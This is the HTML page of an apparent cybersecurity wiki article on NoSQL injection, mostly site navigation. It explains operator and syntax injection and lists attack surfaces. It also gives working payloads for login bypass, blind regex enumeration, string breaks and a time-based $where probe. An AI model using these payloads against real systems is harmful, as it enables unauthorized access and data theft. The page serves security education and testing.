@@ -1,0 +1,1989 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="NoSQL Injection # NoSQL Injection Fundamentals # What is NoSQLi? # NoSQL Injection occurs when untrusted user input is embedded into NoSQL queries without proper validation or sanitization, leading to unauthorized actions such as authentication bypass, data theft, or remote code execution. It can be exploited via syntax injection and operator injection.
+Syntax injection - This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload.">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="NoSQL Injection" />
+<meta property="og:description" content="NoSQL Injection # NoSQL Injection Fundamentals # What is NoSQLi? # NoSQL Injection occurs when untrusted user input is embedded into NoSQL queries without proper validation or sanitization, leading to unauthorized actions such as authentication bypass, data theft, or remote code execution. It can be exploited via syntax injection and operator injection.
+Syntax injection - This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/NoSQL-Injection/" /><meta property="article:section" content="docs" />
+
+<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30" />
+<title>NoSQL Injection | Cyber Security Wiki</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+<!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
+    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Application Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
+    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Thick Client</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/checklist/" class="">Checklist</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/learningprocess_linux/" class="">Learning Process - Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/learningprocess_windows/" class="">Learning Process - Windows</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/tools_linux/" class="">Tools - Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/tools_windows/" class="">Tools - Windows</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
+    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Vulnerable Applications</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/Vulnerable-Applications/Api/" class="">API</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/Vulnerable-Applications/WebApp/" class="">Web App</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
+    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Web</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Account-Takeover/" class="">Account Takeover</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Broken-Access-Control/" class="">Broken Access Control</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Broken-Function-Level-Authorization-BFLA/" class="">Broken Function Level Authorization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Buffer-Overflow/" class="">Buffer Overflow</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Business-logic-Vulnerabilities/" class="">Business Logic</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/charset-xss/" class="">Charset XSS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Clickjacking/" class="">Clickjacking</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Client-Side-Template-Injection-CSTI/" class="">Client Side Template Injection (CSTI)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CORS/" class="">CORS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Credential-Stuffing/" class="">Credential Stuffing</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CRLF-Injection/" class="">CRLF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Cross-Site-Request-Forgery-CSRF/" class="">Cross-Site Request Forgery (CSRF)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Cross-Site-Scripting-XSS/" class="">Cross-Site Scripting (XSS)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CSV-Injection/" class="">CSV Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Denial-of-Service-DOS/" class="">Denial of Service (DOS)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/DOM-Clobbering/" class="">DOM Clobbering</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/GraphQL/" class="">GraphQL</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/HTTP-Host-Header-Injection/" class="">HTTP Host Header Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/HTTP-Request-Smuggling/" class="">HTTP Request Smuggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Identification-and-Authentication-Failures/" class="">Identification and Authentication Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Information-Disclosure/" class="">Information Disclosure</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Information-Gathering/" class="">Information Gathering</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insecure-Deserialization/" class="">Insecure Deserialization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insecure-Direct-Object-Reference-IDOR/" class="">Insecure Direct Object Reference (IDOR)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insufficient-Transport-Layer-Protection/" class="">Insufficient Transport Layer Protection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/JWT/" class="">JWT</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/LDAP-Injection/" class="">LDAP Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Mass-Assignment/" class="">Mass Assignment</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/MFA-Bypass/" class="">Multi-Factor Authentication (MFA) Bypass</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/NoSQL-Injection/" class=" active">NoSQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/OAuth-Cheatsheet/" class="">OAuth (Open Authorization)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Open-Redirect/" class="">Open Redirect</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Padding-Oracle-Attacks/" class="">Padding Oracle Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Privilege-Escalation-Horizontal-Vertical/" class="">Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Prototype-Pollution/" class="">Prototype Pollution</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Race-Conditions/" class="">Race Conditions</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Rate-Limiting/" class="">Rate Limiting</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Registration-Signup-Logic-Flaws/" class="">Registration / Signup Logic Flaws</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Security-Logging-and-Monitoring-Failures/" class="">Security Logging and Monitoring Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Security-Misconfiguration/" class="">Security Misconfiguration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Sensitive-Data-Exposure/" class="">Sensitive Data Exposure</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Server-Side-Request-Forgery-SSRF/" class="">Server-Side Request Forgery (SSRF)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Server-Side-Template-Injection-SSTI/" class="">Server-Side Template Injection (SSTI)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Session-Management-Weaknesses/" class="">Session Management Weaknesses</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Software-Data-Integrity-Failures/" class="">Software &amp; Data Integrity Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Subdomain-Takeover/" class="">Subdomain Takeover</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Third-party-service-integration-issues/" class="">Third party service integration issues</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Token-Predictability-Issues-Cheatsheet/" class="">Token Predictability / Poor Randomness</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Unrestricted-Resource-Consumption/" class="">Unrestricted Resource Consumption</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Vulnerable-Outdated-Components/" class="">Vulnerable &amp; Outdated Components</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Weak-Cryptography-Implementation/" class="">Weak Cryptography Implementation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Weak-SSL-TLS-Configurations/" class="">Weak SSL/TLS Configurations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Web-Cache-Deception/" class="">Web Cache Deception</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Web-Cache-Poisoning/" class="">Web Cache Poisoning</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/XPath-Injection/" class="">XPath Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/XXE-XML-External-Entities/" class="">XXE (XML External Entities)</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
+    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Cloud Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
+    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">DevSecOps</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
+    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Exploit Development</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
+    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">IoT Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
+    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Machine Learning</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/machine-learning/learning/" class="">Learning Process</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
+    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Network</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
+    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Red Teaming</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
+    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Threat Modelling</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+<hr>
+<b>
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/contribute/" >
+        Contribute
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://securecode.wiki" target="_blank" rel="noopener">
+        Secure Code Wiki by Payatu
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</b>
+</nav>
+
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>NoSQL Injection</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#nosql-injection">NoSQL Injection</a>
+      <ul>
+        <li><a href="#nosql-injection-fundamentals">NoSQL Injection Fundamentals</a>
+          <ul>
+            <li><a href="#what-is-nosqli">What is NoSQLi?</a></li>
+            <li><a href="#sqli-vs-nosqli">SQLi vs NoSQLi</a></li>
+          </ul>
+        </li>
+        <li><a href="#attack-surface">Attack Surface</a></li>
+        <li><a href="#operator-based-injection">Operator-Based Injection</a></li>
+        <li><a href="#syntax-injection"><strong>Syntax Injection</strong></a>
+          <ul>
+            <li><a href="#string-context-break">String Context Break</a></li>
+            <li><a href="#javascript-injection-where">JavaScript Injection ($where)</a></li>
+            <li><a href="#json-injection">JSON Injection</a></li>
+            <li><a href="#detection">Detection</a></li>
+          </ul>
+        </li>
+        <li><a href="#exploitation--bypassing-defenses">Exploitation &amp; Bypassing defenses</a>
+          <ul>
+            <li><a href="#1-authentication-bypass">1. Authentication Bypass</a></li>
+            <li><a href="#2-data-extraction">2. Data Extraction</a></li>
+            <li><a href="#3-privilege-escalation">3. Privilege Escalation</a></li>
+            <li><a href="#4-denial-of-service-dos">4. Denial of Service (DoS)</a></li>
+            <li><a href="#5-remote-code-execution-rce">5. Remote Code Execution (RCE)</a></li>
+            <li><a href="#6-schema-manipulation--tampering">6. Schema Manipulation &amp; Tampering</a></li>
+          </ul>
+        </li>
+        <li><a href="#advance-attack-scenarios">Advance Attack Scenarios</a>
+          <ul>
+            <li><a href="#1-second-order-nosql-injection">1. Second-Order NoSQL Injection</a></li>
+            <li><a href="#2-mongodb-aggregation-pipeline-injection">2. MongoDB Aggregation Pipeline Injection</a></li>
+            <li><a href="#3-graphql--mongodb-injection">3. GraphQL + MongoDB Injection</a></li>
+            <li><a href="#4-neo4j-database-graph-oriented-database">4. Neo4j Database (graph-oriented database)</a></li>
+          </ul>
+        </li>
+        <li><a href="#payload-repository">Payload Repository</a></li>
+        <li><a href="#test-cases">Test Cases</a></li>
+        <li><a href="#detection-techniques">Detection Techniques</a>
+          <ul>
+            <li><a href="#a-manual-detection">A. Manual Detection</a></li>
+            <li><a href="#b-automated-tools">B. Automated Tools</a></li>
+          </ul>
+        </li>
+        <li><a href="#impact">Impact</a></li>
+        <li><a href="#prevention--mitigation">Prevention &amp; Mitigation</a></li>
+        <li><a href="#good-to-read">Good To Read</a></li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="nosql-injection">
+  NoSQL Injection
+  <a class="anchor" href="#nosql-injection">#</a>
+</h1>
+<h2 id="nosql-injection-fundamentals">
+  NoSQL Injection Fundamentals
+  <a class="anchor" href="#nosql-injection-fundamentals">#</a>
+</h2>
+<h3 id="what-is-nosqli">
+  What is NoSQLi?
+  <a class="anchor" href="#what-is-nosqli">#</a>
+</h3>
+<p>NoSQL Injection occurs when untrusted user input is embedded into NoSQL queries without proper validation or sanitization, leading to unauthorized actions such as authentication bypass, data theft, or remote code execution. It can be exploited via syntax injection and operator injection.</p>
+<ul>
+<li>Syntax injection - This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload.</li>
+<li>Operator injection - This occurs when you can use NoSQL query operators to manipulate queries.</li>
+</ul>
+<h3 id="sqli-vs-nosqli">
+  SQLi vs NoSQLi
+  <a class="anchor" href="#sqli-vs-nosqli">#</a>
+</h3>
+<table>
+<thead>
+<tr>
+<th>Aspect</th>
+<th>SQL Injection</th>
+<th>NoSQL Injection</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Query Language</td>
+<td>SQL</td>
+<td>JSON, BSON, JavaScript, Lua</td>
+</tr>
+<tr>
+<td>Syntax</td>
+<td><code>' OR '1'='1</code></td>
+<td><code>{&quot;$ne&quot;: null}</code></td>
+</tr>
+<tr>
+<td>Execution Context</td>
+<td>DB server</td>
+<td>App server / DB engine</td>
+</tr>
+<tr>
+<td>Query Formation</td>
+<td>String concatenation</td>
+<td>JSON/JavaScript embedding</td>
+</tr>
+<tr>
+<td>DB Targets</td>
+<td>MySQL, PostgreSQL</td>
+<td>MongoDB, CouchDB, Firebase, Redis</td>
+</tr>
+<tr>
+<td>Operator Usage</td>
+<td>Logical/Arithmetic (AND, OR)</td>
+<td><code>$ne</code>, <code>$gt</code>, <code>$regex</code>, <code>$where</code></td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="attack-surface">
+  Attack Surface
+  <a class="anchor" href="#attack-surface">#</a>
+</h2>
+<p>Common locations to probe for NoSQL injection:</p>
+<table>
+<thead>
+<tr>
+<th>Entry Point</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Login / Auth endpoints</strong></td>
+<td><code>POST /login</code> with username/password JSON body</td>
+</tr>
+<tr>
+<td><strong>Search and filter APIs</strong></td>
+<td><code>GET /api/products?name=shirt</code>, filter parameters</td>
+</tr>
+<tr>
+<td><strong>GraphQL queries</strong></td>
+<td>Nested query variables passed to MongoDB resolver</td>
+</tr>
+<tr>
+<td><strong>ODM/ORM layer</strong></td>
+<td>Mongoose <code>.find()</code> / <code>.findOne()</code> with unsanitized input</td>
+</tr>
+<tr>
+<td><strong>HTTP GET params</strong></td>
+<td><code>?id[$ne]=0</code>, <code>?role[$in][]=admin</code></td>
+</tr>
+<tr>
+<td><strong>Cookie / Header values</strong></td>
+<td>Session token, role header passed to DB lookup</td>
+</tr>
+<tr>
+<td><strong>Password reset flows</strong></td>
+<td>Email lookup query built from user-supplied email</td>
+</tr>
+<tr>
+<td><strong>JSON API body</strong></td>
+<td>Any field accepting object-type input in JSON</td>
+</tr>
+</tbody>
+</table>
+<h2 id="operator-based-injection">
+  Operator-Based Injection
+  <a class="anchor" href="#operator-based-injection">#</a>
+</h2>
+<p>Exploiting MongoDB query operators to manipulate database logic and bypass security controls.</p>
+<table>
+<thead>
+<tr>
+<th>Operator</th>
+<th>Description</th>
+<th>Use Case</th>
+<th>Payload Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>$ne</td>
+<td>Not equal</td>
+<td>Auth bypass / inequality</td>
+<td>{&ldquo;user&rdquo;: {&quot;$ne&quot;: null}}</td>
+</tr>
+<tr>
+<td>$gt / $lt</td>
+<td>Greater/Less than</td>
+<td>Dump data / type confusion</td>
+<td>{&ldquo;age&rdquo;: {&quot;$gt&quot;: 0}}</td>
+</tr>
+<tr>
+<td>$in / $nin</td>
+<td>In / Not in array</td>
+<td>Value bruteforce / DoS</td>
+<td>{&ldquo;id&rdquo;: {&quot;$in&quot;: [1,2,3,4]}}</td>
+</tr>
+<tr>
+<td>$or / $and</td>
+<td>Logical OR/AND</td>
+<td>Auth bypass / logic abuse</td>
+<td>{&quot;$or&quot;: [{&ldquo;admin&rdquo;: true}, {}]}</td>
+</tr>
+<tr>
+<td>$exists</td>
+<td>Field existence check</td>
+<td>Discover hidden fields</td>
+<td>{&ldquo;SSN&rdquo;: {&quot;$exists&quot;: true}}</td>
+</tr>
+<tr>
+<td>$regex</td>
+<td>Regular expression</td>
+<td>Blind enumeration</td>
+<td>{&ldquo;email&rdquo;: {&quot;$regex&quot;: &ldquo;^a&rdquo;}}</td>
+</tr>
+<tr>
+<td>$where</td>
+<td>JavaScript expression</td>
+<td>RCE / complex logic bypass</td>
+<td>{&quot;$where&quot;: &ldquo;return true&rdquo;}</td>
+</tr>
+<tr>
+<td>$not</td>
+<td>Invert operator result</td>
+<td>Reverse filter conditions</td>
+<td>{&ldquo;age&rdquo;: {&quot;$not&quot;: {&quot;$gt&quot;: 10}}}</td>
+</tr>
+</tbody>
+</table>
+<p>Common Patterns:</p>
+<pre tabindex="0"><code>{&#34;username&#34;: {&#34;$ne&#34;: null}, &#34;password&#34;: {&#34;$ne&#34;: null}}     // Bypass login with inequality
+{&#34;role&#34;: {&#34;$in&#34;: [&#34;admin&#34;, &#34;moderator&#34;]}}                  // Privilege enumeration
+{&#34;isActive&#34;: {&#34;$exists&#34;: false}}                           // Find incomplete records
+{&#34;price&#34;: {&#34;$gt&#34;: 0, &#34;$lt&#34;: 999999}}                       // Extract all records in range
+</code></pre><hr>
+<h2 id="syntax-injection">
+  <strong>Syntax Injection</strong>
+  <a class="anchor" href="#syntax-injection">#</a>
+</h2>
+<h3 id="string-context-break">
+  String Context Break
+  <a class="anchor" href="#string-context-break">#</a>
+</h3>
+<pre tabindex="0"><code>admin&#39; || &#39;1&#39;==&#39;1                                           // Always true
+admin&#39; &amp;&amp; this.password.match(/.*/)//                       // Regex bypass + comment
+</code></pre><h3 id="javascript-injection-where">
+  JavaScript Injection ($where)
+  <a class="anchor" href="#javascript-injection-where">#</a>
+</h3>
+<pre tabindex="0"><code>{&#34;$where&#34;: &#34;sleep(5000)&#34;}                                   // Time-based blind
